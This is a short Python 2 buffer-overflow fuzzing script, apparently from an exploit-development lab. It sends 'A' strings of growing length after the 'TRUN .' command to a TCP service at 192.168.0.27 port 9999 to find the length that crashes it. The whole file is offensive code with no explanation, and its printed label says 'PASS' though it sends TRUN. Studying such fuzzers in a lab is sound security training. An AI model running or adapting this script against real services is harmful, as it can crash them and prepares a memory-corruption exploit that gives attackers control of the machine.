#!/usr/bin/python
import socket

buffer=["A"]
counter=100
while len(buffer) <= 30:
  buffer.append("A"*counter)
  counter=counter+200

for string in buffer:
  print "Fuzzing PASS with %s bytes" % len(string)
  s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect=s.connect(('192.168.0.27',9999))
  s.recv(1024)
  s.send(('TRUN .' + string + '\r\n'))
  s.recv(1024)
  s.send('EXIT\r\n')
  s.close()